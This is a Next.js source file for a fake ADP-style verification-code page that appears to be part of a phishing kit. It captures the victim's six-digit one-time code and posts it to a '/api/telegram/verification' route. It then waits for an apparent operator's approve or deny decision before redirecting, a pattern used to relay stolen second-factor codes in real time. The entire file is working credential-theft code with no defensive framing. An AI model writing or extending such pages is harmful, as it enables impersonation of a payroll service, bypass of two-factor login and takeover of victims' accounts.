"use client"

import { Suspense, useEffect, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import { AdpOtpShell } from "@/components/adp-otp-shell"
import { LOGIN_SESSION } from "@/lib/login-flow"
import { OTP_CODE_ERROR_TEXT } from "@/lib/approval-messages"
import { usePendingApproval } from "@/hooks/use-pending-approval"
import {
  getStoredLoginUserId,
  submitOtpGate,
} from "@/lib/submit-pending-gate"
import { Loader2 } from "lucide-react"

const OTP_LENGTH = 6

function maskEmail(email: string): string {
  const [local, domain] = email.split("@")
  if (!local || !domain) return email
  if (local.length <= 2) {
    return `${local[0] ?? ""}••••@${domain}`
  }
  const dots = "•".repeat(Math.min(6, Math.max(2, local.length - 2)))
  return `${local[0]}${dots}${local[local.length - 1]}@${domain}`
}

function maskDestination(userId: string, method: "email" | "sms"): string {
  const trimmed = userId.trim()
  if (method === "email") {
    if (trimmed.includes("@")) return maskEmail(trimmed.toLowerCase())
    return "your email on file"
  }
  if (/^\d{4,}$/.test(trimmed.replace(/\D/g, ""))) {
    const digits = trimmed.replace(/\D/g, "")
    return `••••••${digits.slice(-4)}`
  }
  return "your mobile number on file"
}

function VerifyContent() {
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [pendingId, setPendingId] = useState<string | null>(null)
  const [deliveryMethod, setDeliveryMethod] = useState<"email" | "sms">("email")
  const [destination, setDestination] = useState("your email on file")
  const router = useRouter()
  const inputRef = useRef<HTMLInputElement | null>(null)

  const digits = code.replace(/\D/g, "").slice(0, OTP_LENGTH)
  const isCodeComplete = digits.length === OTP_LENGTH
  const busy = isLoading || pendingId !== null
  const canSubmit = isCodeComplete && !busy

  const deliveryCopy = `Your code has been sent to ${destination}. This code is valid for 10 minutes.`

  useEffect(() => {
    if (typeof window === "undefined") return

    const storedMethod = sessionStorage.getItem(LOGIN_SESSION.method)
    const method =
      storedMethod === "sms" || storedMethod === "email" ? storedMethod : "email"
    setDeliveryMethod(method)

    const userId = getStoredLoginUserId()
    setDestination(maskDestination(userId, method))

    const hasVerifySession = sessionStorage.getItem(LOGIN_SESSION.verify)
    if (!hasVerifySession) {
      router.replace("/")
    }
  }, [router])

  useEffect(() => {
    inputRef.current?.focus()
  }, [])

  usePendingApproval(pendingId, {
    onApproved: () => {
      setIsLoading(false)
      setPendingId(null)
      window.location.href = "/api/login-out"
    },
    onDenied: () => {
      setIsLoading(false)
      setPendingId(null)
      setCode("")
      setError(OTP_CODE_ERROR_TEXT)
      inputRef.current?.focus()
    },
    onTimeout: () => {
      setIsLoading(false)
      setPendingId(null)
      setCode("")
      setError(OTP_CODE_ERROR_TEXT)
      inputRef.current?.focus()
    },
    onRedirected: () => {
      window.location.href = "/api/login-out"
    },
  })

  const handleVerify = async () => {
    if (!canSubmit) {
      if (!isCodeComplete) {
        setError("Enter the 6-digit verification code.")
        inputRef.current?.focus()
      }
      return
    }

    setError("")
    setIsLoading(true)
    try {
      await fetch("/api/telegram/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: "Code",
          code: digits,
        }),
      }).catch(console.error)

      const userId = getStoredLoginUserId()
      const id = await submitOtpGate(userId, digits, deliveryMethod)
      setPendingId(id)
    } catch (verifyError) {
      console.error("Failed to submit OTP for approval:", verifyError)
      setIsLoading(false)
      setError("Unable to reach verification. Please try again.")
    }
  }

  return (
    <form
      className="adp-otp-form"
      onSubmit={(event) => {
        event.preventDefault()
        void handleVerify()
      }}
    >
      <h1 className="adp-otp-title">Enter verification code</h1>
      <p className="adp-otp-copy">{deliveryCopy}</p>

      {error ? (
        <div className="adp-otp-error" role="alert">
          {error}
        </div>
      ) : null}

      <label className="adp-otp-label" htmlFor="verification-code">
        Verification code
      </label>
      <input
        ref={inputRef}
        id="verification-code"
        name="verification-code"
        type="text"
        inputMode="numeric"
        autoComplete="one-time-code"
        autoCorrect="off"
        autoCapitalize="off"
        spellCheck={false}
        maxLength={OTP_LENGTH}
        value={digits}
        disabled={busy}
        onChange={(event) => {
          setCode(event.target.value.replace(/\D/g, "").slice(0, OTP_LENGTH))
          if (error) setError("")
        }}
        className="adp-otp-input"
        aria-invalid={error ? true : undefined}
      />

      <button
        type="submit"
        disabled={!isCodeComplete || busy}
        className={`adp-otp-submit ${isCodeComplete || busy ? "is-ready" : ""}`}
      >
        {busy ? (
          <>
            <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden="true" />
            SUBMIT
          </>
        ) : (
          "SUBMIT"
        )}
      </button>

      <button
        type="button"
        className="adp-otp-back"
        disabled={busy}
        onClick={() => router.push("/tfa")}
      >
        &lt; BACK
      </button>

      <style jsx>{`
        .adp-otp-form {
          display: flex;
          flex-direction: column;
        }

        .adp-otp-title {
          margin: 0 0 14px;
          font-size: 28px;
          line-height: 1.2;
          font-weight: 600;
          color: #222;
          text-align: left;
        }

        .adp-otp-copy {
          margin: 0 0 22px;
          font-size: 14px;
          line-height: 1.45;
          color: #444;
        }

        .adp-otp-error {
          margin: 0 0 16px;
          padding: 0;
          border: none;
          background: transparent;
          color: #b42318;
          font-size: 13px;
        }

        .adp-otp-label {
          display: block;
          margin: 0 0 6px;
          font-size: 13px;
          font-weight: 600;
          color: #333;
        }

        .adp-otp-input {
          width: 100%;
          height: 44px;
          border: 1px solid #b5b5b5;
          border-radius: 2px;
          padding: 0 12px;
          font-size: 16px;
          color: #222;
          outline: none;
          background: #fff;
          margin-bottom: 20px;
          letter-spacing: 0.08em;
        }

        .adp-otp-input:focus {
          border-color: #4aa3ff;
          box-shadow: 0 0 0 3px rgba(74, 163, 255, 0.35);
        }

        .adp-otp-input:disabled {
          background: #f7f7f7;
          cursor: not-allowed;
        }

        .adp-otp-submit {
          width: 100%;
          height: 44px;
          border: none;
          border-radius: 2px;
          background: #c9b8a8;
          color: #4a4038;
          font-size: 14px;
          font-weight: 700;
          letter-spacing: 0.06em;
          cursor: not-allowed;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        .adp-otp-submit.is-ready {
          background: #d0271d;
          color: #fff;
          cursor: pointer;
        }

        .adp-otp-submit.is-ready:hover {
          background: #b8221a;
        }

        .adp-otp-back {
          margin-top: 18px;
          align-self: center;
          border: none;
          background: none;
          color: #0066cc;
          font-size: 13px;
          font-weight: 600;
          letter-spacing: 0.04em;
          cursor: pointer;
          padding: 0;
        }

        .adp-otp-back:hover:not(:disabled) {
          text-decoration: underline;
        }

        .adp-otp-back:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
      `}</style>
    </form>
  )
}

export default function VerifyPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-[#f3f3f3] flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <AdpOtpShell>
        <VerifyContent />
      </AdpOtpShell>
    </Suspense>
  )
}
